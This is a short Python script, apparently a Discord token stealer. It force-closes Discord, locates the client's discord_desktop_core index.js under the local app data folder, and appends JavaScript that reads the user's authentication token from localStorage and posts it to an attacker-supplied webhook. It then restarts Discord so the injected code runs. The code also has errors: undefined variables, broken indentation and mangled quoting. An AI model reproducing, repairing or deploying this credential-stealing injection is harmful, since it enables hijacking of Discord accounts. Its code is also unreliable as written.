import os
os.system('taskkill /f /im discord.exe >nul')
webhook = 'YOUR WEBHOOK'
env = os.getenv('localappdata')
for a, b, _ in os.walk(env):
	for c in b:
		if 'discord-desktop-core-' in d:
			e = os.path.join(root,f"{c}\\discord_desktop_core\\index.js")
			with open(e,'a',encoding='utf-8') as f:
                f.write(f"var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C[\"token\"];var O = new XMLHttpRequest();O.open('POST', '\"{webhook}\"', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{'content': ' + strtoken + '}');\";")
			try: os.startfile(os.getenv('appdata')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk')
			except BaseException: pass
			os._exit()
